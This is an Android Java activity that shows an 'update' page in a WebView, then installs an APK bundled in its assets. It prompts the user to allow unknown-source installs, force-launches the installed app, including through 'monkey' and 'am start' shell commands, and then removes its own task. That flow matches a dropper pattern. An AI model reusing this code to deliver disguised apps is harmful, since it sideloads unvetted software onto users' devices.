package com.example.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.view.WindowInsetsController;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private static final String APK_NAME = "plugin.apk";
    private static final int REQUEST_INSTALL = 100;
    private static final String ACTION_INSTALL = "com.example.installer.INSTALL";

    private WebView webView;
    private String packageName = null;
    private String mainActivity = null;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isInstalling = false;
    private NativeInstaller nativeInstaller;

    private BroadcastReceiver installReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
            String message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);

            switch (status) {
                case PackageInstaller.STATUS_PENDING_USER_ACTION:
                    Intent confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                    if (confirmIntent != null) {
                        try {
                            confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            startActivity(confirmIntent);
                        } catch (Exception e) {
                        }
                    }
                    break;

                case PackageInstaller.STATUS_SUCCESS:
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            toast("Installed successfully");
                            isInstalling = false;
                        }
                    });

                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            forceOpenApp();
                        }
                    }, 500);
                    break;

                default:
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Installation failed");
                            if (webView != null) {
                                webView.loadUrl("file:///android_asset/update/update.html?error=true");
                            }
                        }
                    });
                    break;
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setupSystemBars();

        try {
            IntentFilter filter = new IntentFilter(ACTION_INSTALL);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(installReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
            } else {
                registerReceiver(installReceiver, filter);
            }
            android.util.Log.d(TAG, "BroadcastReceiver registered successfully");
        } catch (Exception e) {
            android.util.Log.e(TAG, "Failed to register BroadcastReceiver", e);
        }

        nativeInstaller = new NativeInstaller();
        setupWebView();
    }

    private void setupWebView() {
        try {
            webView = new WebView(this);
            android.webkit.WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setMediaPlaybackRequiresUserGesture(false);
            settings.setJavaScriptCanOpenWindowsAutomatically(true);

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                }
            });

            webView.setWebChromeClient(new WebChromeClient());
            webView.addJavascriptInterface(new WebAppInterface(), "Android");

            setContentView(webView);

            if (checkAssetExists("update/update.html")) {
                webView.loadUrl("file:///android_asset/update/update.html");
            } else {
                showErrorPage();
            }
        } catch (Exception e) {
            finish();
        }
    }

    private boolean checkAssetExists(String assetPath) {
        try {
            InputStream inputStream = getAssets().open(assetPath);
            inputStream.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private void showErrorPage() {
        String html = "<!DOCTYPE html><html><head>" +
                "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
                "<style>body{font-family:Arial;text-align:center;padding:50px;background:white;}" +
                "h1{color:#333;}p{color:#666;}</style></head><body>" +
                "<h1>Error</h1><p>Application resources not found.</p></body></html>";
        webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
    }

    class WebAppInterface {
        @JavascriptInterface
        public void installPlugin() {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    if (!isInstalling) {
                        checkPermission();
                    } else {
                        toast("Installation in progress");
                    }
                }
            });
        }
    }

    private void checkPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQUEST_INSTALL);
                } catch (Exception e) {
                    toast("Please enable install from unknown sources");
                }
                return;
            }
        }
        install();
    }

    private void install() {
        if (isInstalling) {
            return;
        }

        isInstalling = true;

        handler.post(new Runnable() {
            @Override
            public void run() {
                if (checkAssetExists("update/installing.html")) {
                    webView.loadUrl("file:///android_asset/update/installing.html");
                }
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    readApkInfo();

                    if (packageName == null) {
                        throw new Exception("Package name is null");
                    }

                    String apkPath = copyApkToCache();
                    if (apkPath == null) {
                        throw new Exception("Failed to copy APK");
                    }

                    android.util.Log.d(TAG, "Starting native installation, APK path: " + apkPath);
                    boolean result = nativeInstaller.installApk(MainActivity.this, apkPath);
                    android.util.Log.d(TAG, "Native installation result: " + result);

                    if (!result) {
                        throw new Exception("Native installation failed");
                    }
                    
                    android.util.Log.d(TAG, "Installation initiated successfully, waiting for callback");

                } catch (Exception e) {
                    final String errorMsg = e.getMessage();
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            isInstalling = false;
                            toast("Failed: " + errorMsg);
                            webView.loadUrl("file:///android_asset/update/update.html?error=install");
                        }
                    });
                }
            }
        }).start();
    }

    private String copyApkToCache() {
        try {
            File tempFile = new File(getCacheDir(), "plugin.apk");

            InputStream in = getAssets().open(APK_NAME);
            FileOutputStream out = new FileOutputStream(tempFile);

            byte[] buffer = new byte[65536];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }

            in.close();
            out.close();

            return tempFile.getAbsolutePath();
        } catch (Exception e) {
            return null;
        }
    }

    private void readApkInfo() {
        try {
            File tempFile = new File(getCacheDir(), "temp.apk");

            InputStream in = getAssets().open(APK_NAME);
            FileOutputStream out = new FileOutputStream(tempFile);

            byte[] buffer = new byte[8192];
            int read;
            while ((read = in.read(buffer)) != -1) {
                out.write(buffer, 0, read);
            }
            in.close();
            out.close();

            if (!tempFile.exists() || tempFile.length() == 0) {
                tempFile.delete();
                return;
            }

            PackageManager pm = getPackageManager();

            int flags = PackageManager.GET_ACTIVITIES;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                flags |= PackageManager.GET_SIGNING_CERTIFICATES;
            }

            PackageInfo info = pm.getPackageArchiveInfo(
                    tempFile.getAbsolutePath(), flags);

            if (info != null) {
                packageName = info.packageName;

                if (info.activities != null && info.activities.length > 0) {
                    mainActivity = info.activities[0].name;
                }
            }

            tempFile.delete();

        } catch (Exception e) {
        }
    }

    private void forceOpenApp() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(800);

                    if (tryMethod1()) {
                    } else {
                        Thread.sleep(300);

                        if (tryMethod4()) {
                        } else {
                            Thread.sleep(300);
                            tryMethod2();
                            Thread.sleep(300);
                            tryMethod3();
                        }
                    }

                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                finishAndRemoveTask();
                            } else {
                                finish();
                            }
                        }
                    }, 1000);

                } catch (Exception e) {
                }
            }
        }).start();
    }

    private boolean tryMethod1() {
        try {
            if (packageName == null || mainActivity == null) return false;

            Intent intent = new Intent();
            intent.setComponent(new ComponentName(packageName, mainActivity));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            return true;

        } catch (Exception e) {
            return false;
        }
    }

    private void tryMethod2() {
        try {
            if (packageName == null) return;

            String cmd = "monkey -p " + packageName + " 1";
            Process p = Runtime.getRuntime().exec(cmd);
            p.waitFor();

        } catch (Exception e) {
        }
    }

    private void tryMethod3() {
        try {
            if (packageName == null || mainActivity == null) return;

            String cmd = "am start -n " + packageName + "/" + mainActivity;
            Process p = Runtime.getRuntime().exec(cmd);
            p.waitFor();

        } catch (Exception e) {
        }
    }

    private boolean tryMethod4() {
        try {
            if (packageName == null) return false;

            PackageManager pm = getPackageManager();
            Intent intent = pm.getLaunchIntentForPackage(packageName);

            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                return true;
            }
            return false;

        } catch (Exception e) {
            return false;
        }
    }

    private void setupSystemBars() {
        try {
            android.view.Window window = getWindow();

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);

                WindowInsetsController controller = window.getInsetsController();
                if (controller != null) {
                    controller.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_STATUS_BARS);
                    controller.setSystemBarsAppearance(
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS,
                            WindowInsetsController.APPEARANCE_LIGHT_NAVIGATION_BARS);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                window.setStatusBarColor(Color.WHITE);
                window.setNavigationBarColor(Color.WHITE);

                int flags = window.getDecorView().getSystemUiVisibility();
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    flags |= View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR;
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                    flags |= View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR;
                }
                window.getDecorView().setSystemUiVisibility(flags);
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void onBackPressed() {
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (Exception e) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_INSTALL) {
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        if (getPackageManager().canRequestPackageInstalls()) {
                            install();
                        } else {
                            toast("Permission required");
                            isInstalling = false;
                            if (webView != null) {
                                webView.loadUrl("file:///android_asset/update/update.html?error=permission");
                            }
                        }
                    }
                }
            }, 300);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        try {
            unregisterReceiver(installReceiver);
        } catch (Exception e) {
        }

        try {
            if (webView != null) {
                webView.destroy();
            }
        } catch (Exception e) {
        }
    }

    private void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }
}
